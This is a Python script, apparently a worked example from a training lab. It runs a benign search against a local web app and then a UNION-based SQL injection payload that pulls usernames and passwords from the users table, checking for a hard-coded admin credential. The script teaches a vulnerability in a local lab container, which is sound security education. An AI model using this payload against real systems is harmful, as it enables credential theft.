"""Worked example: a benign search, then a UNION injection that steals credentials.

Runs inside the lab container against the local app. Deterministic and offline —
it proves the vulnerability so you can see the goal before doing it yourself with
sqlmap (see the lab).
"""
import json
import time
import urllib.error
import urllib.parse
import urllib.request

BASE = "http://localhost:5000/search"


def search(name):
    url = BASE + "?" + urllib.parse.urlencode({"name": name})
    with urllib.request.urlopen(url) as resp:
        return json.load(resp)


def wait_for_server(attempts=20):
    for _ in range(attempts):
        try:
            search("")
            return
        except urllib.error.URLError:
            time.sleep(0.5)
    raise SystemExit("server did not come up — is the container running? (make up)")


def main():
    wait_for_server()

    print("== Benign search: name=Doe ==")
    benign = search("Doe")
    print("Query :", benign["query"])
    print("Result:", benign["results"])

    print("\n== Injection: UNION-extract the users table ==")
    payload = "' UNION SELECT username, password FROM users-- "
    out = search(payload)
    print("Query :", out["query"])
    print("Leaked:")
    for row in out["results"]:
        print("    ", row)

    leaked = {tuple(r) for r in out["results"]}
    if ("admin", "S3cr3t-Meridian-Admin!") in leaked:
        print("\n[+] Success: admin credentials exfiltrated via SQL injection.")
    else:
        raise SystemExit("[-] Injection did not leak the expected credentials.")


if __name__ == "__main__":
    main()
